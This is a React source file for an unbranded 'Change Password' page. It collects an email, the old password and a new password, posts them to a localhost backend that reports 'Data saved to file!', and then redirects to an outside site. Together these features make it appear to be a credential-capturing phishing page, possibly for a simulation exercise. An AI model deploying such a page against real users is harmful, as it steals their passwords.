import React, { useState, useEffect } from 'react';
import ReactGA from 'react-ga4';
import { BrowserRouter as Router, Routes, Route } from 'react-router-dom';
import './App.css';


function ChangePasswordForm() {
  useEffect(() => {
    ReactGA.initialize('G-GKTHK8NP11');
    ReactGA.send('pageview'); // Track page visit
  }, []);
  const [email, setEmail] = useState('');
  const [old_password, setOldPassword] = useState('');
  const [new_password, setNewPassword] = useState('');
  const[ error, setError] = useState('');

  const handleSubmit = async (e) => {
      e.preventDefault();

    if (!email || !old_password || !new_password) {
      setError('Please fill in all fields');
      return;
    }

    if (old_password === new_password) {
      setError('New password must be different from old password');
      return;
    }


    try {
    // Send data to backend
    const response = await fetch('http://localhost:5000/api/changePassword', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({ email, old_password, new_password }),
    });

    const data = await response.json();

    if (data.success) {
      console.log('Data saved to file!');
      setError('');
      alert('Password change successful!');
      window.location.href = 'https://example.com/';
    } else {
      setError('Failed to save password data');
    }
  } catch (error) {
    console.error('Error:', error);
    setError('Could not connect to server');
  }

  };

  return (
    <div className="App">
      <div className="login-container">
         { /*Header Section*/ }
         <h2>Change Password</h2>

        { /*Login Form Section*/ }
        <p className="subtitle">Please enter your email and old password to create a new password</p>
        <form onSubmit={handleSubmit}>

            <div className="input-group">
                <label htmlFor="email">Email</label>
                <input
                  type="email"
                  id="email"
                  value={email}
                  onChange={(e) => setEmail(e.target.value)}
                  placeholder="Enter your email"
                />
            </div>

            <div className="input-group">
            <label htmlFor="old_password">Old Password</label>
            <input
              type="password"
              id="old_password"
              value={old_password}
              onChange={(e) => setOldPassword(e.target.value)}
              placeholder="Enter your old password"
            />
          </div>

            <div className="input-group">
                <label htmlFor="new_password">New Password</label>
                <input
                  type="password"
                  id="new_password"
                  value={new_password}
                  onChange={(e) => setNewPassword(e.target.value)}
                  placeholder="Enter your New password"
                />
            </div>

            {error && <div className="error-message">{error}</div>}

            <button type="submit" className="login-button">
                Change Password
            </button>
        </form>
      </div>
    </div>
  );
}

function App() {
  return (
    <Router>
      <Routes>
        <Route path="/changePassword" element={<ChangePasswordForm />} />
        <Route path="/" element={<div style={{textAlign: 'center', marginTop: '50px'}}>Navigate to /changePassword</div>} />
      </Routes>
    </Router>
  );
}

export default App;
